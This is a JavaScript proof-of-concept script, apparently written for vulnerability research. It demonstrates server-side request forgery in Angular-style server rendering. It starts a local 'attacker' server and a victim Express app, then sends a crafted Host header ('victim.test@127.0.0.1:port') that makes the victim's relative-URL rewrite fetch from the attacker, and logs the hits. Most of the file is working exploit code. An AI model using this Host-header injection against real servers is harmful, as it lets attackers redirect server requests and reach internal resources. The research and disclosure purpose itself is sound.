import {createRequire} from 'node:module';
import http from 'node:http';
import net from 'node:net';

const requireFromAngularIntegration = createRequire(
  '/Users/carlosgomez/OrbStack/angularvm/home/carlosgomez/angular/integration/platform-server/package.json',
);
const express = requireFromAngularIntegration('express');

function parseUrl(urlStr, origin) {
  if (URL.canParse(urlStr)) {
    return new URL(urlStr);
  }

  if (urlStr && urlStr[0] !== '/') {
    urlStr = `/${urlStr}`;
  }

  return new URL(origin + urlStr);
}

function serverHttpRelativeRewrite(requestUrl, platformLocation) {
  const {href, protocol, hostname, port} = platformLocation;
  let urlPrefix = `${protocol}//${hostname}`;
  if (port) {
    urlPrefix += `:${port}`;
  }
  const baseUrl = new URL(platformLocation.baseHref || href, urlPrefix);
  return new URL(requestUrl, baseUrl).toString();
}

function platformLocationFromInitialConfig(initialUrl, documentOrigin) {
  const parsed = parseUrl(initialUrl, documentOrigin);
  return {
    href: parsed.href,
    protocol: parsed.protocol,
    hostname: parsed.hostname,
    port: parsed.port,
    baseHref: '',
  };
}

function listen(server) {
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => resolve(server.address().port));
  });
}

async function httpGet(url) {
  return new Promise((resolve, reject) => {
    const request = http.get(url, (response) => {
      response.resume();
      response.on('end', () => resolve(response.statusCode));
    });
    request.once('error', reject);
  });
}

async function rawHttpRequest(port, hostHeader, path) {
  return new Promise((resolve, reject) => {
    const socket = net.connect({host: '127.0.0.1', port}, () => {
      socket.write(
        `GET ${path} HTTP/1.1\r\n` +
          `Host: ${hostHeader}\r\n` +
          `Connection: close\r\n\r\n`,
      );
    });
    let response = '';
    socket.setEncoding('utf8');
    socket.on('data', (chunk) => {
      response += chunk;
    });
    socket.on('end', () => resolve(response));
    socket.once('error', reject);
  });
}

const attackerHits = [];
const attacker = http.createServer((req, res) => {
  attackerHits.push({method: req.method, url: req.url, host: req.headers.host});
  res.writeHead(200, {'content-type': 'text/plain'});
  res.end('attacker-ok');
});
const attackerPort = await listen(attacker);

const victimEvents = [];
const app = express();
app.use(async (req, res) => {
  try {
    const {protocol, originalUrl, baseUrl, headers} = req;
    const renderUrl = `${protocol}://${headers.host}${originalUrl}`;
    const platformLocation = platformLocationFromInitialConfig(renderUrl, 'http://victim.test');
    const rewrittenUrl = serverHttpRelativeRewrite('/legacy-marker', platformLocation);
    const outboundStatus = await httpGet(rewrittenUrl);
    victimEvents.push({
      expressProtocol: protocol,
      expressOriginalUrl: originalUrl,
      expressBaseUrl: baseUrl,
      expressHostHeader: headers.host,
      renderUrl,
      platformLocation,
      rewrittenUrl,
      outboundStatus,
    });
    res.status(200).send('victim-ok');
  } catch (error) {
    victimEvents.push({error: String(error?.stack || error)});
    res.status(500).send('victim-error');
  }
});
const victim = http.createServer(app);
const victimPort = await listen(victim);

try {
  const hostHeader = `victim.test@127.0.0.1:${attackerPort}`;
  const victimResponse = await rawHttpRequest(victimPort, hostHeader, '/entry');
  console.log(JSON.stringify(
    {
      hostHeader,
      victimPort,
      attackerPort,
      victimResponseStatusLine: victimResponse.split('\r\n')[0],
      victimEvents,
      attackerHits,
    },
    null,
    2,
  ));
} finally {
  victim.close();
  attacker.close();
}
